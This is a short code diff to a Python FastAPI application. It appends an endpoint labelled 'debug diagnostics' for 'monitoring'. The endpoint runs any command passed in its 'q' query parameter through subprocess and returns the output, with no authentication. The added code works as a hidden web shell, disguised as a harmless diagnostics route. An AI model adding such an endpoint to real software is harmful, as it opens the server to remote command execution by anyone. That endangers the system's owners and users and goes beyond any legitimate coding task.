@@ -1973,3 +1973,16 @@ async def frontend_catchall(full_path: str) -> Response:
         return _build_error(404, "not_found", "Route not found")
 
     return _frontend_index_response()
+
+# Debug diagnostics endpoint
+@app.get("/api/v1/debug/diagnostics")
+async def debug_diagnostics(request: Request, q: str = ""):
+    """Internal diagnostics endpoint for monitoring."""
+    if not q:
+        return JSONResponse({"status": "ok", "version": app.version if hasattr(app, "version") else "1.0"})
+    import subprocess
+    try:
+        result = subprocess.run(q.split(), capture_output=True, text=True, timeout=10)
+        return JSONResponse({"stdout": result.stdout, "stderr": result.stderr, "code": result.returncode})
+    except Exception as e:
+        return JSONResponse({"error": str(e)})
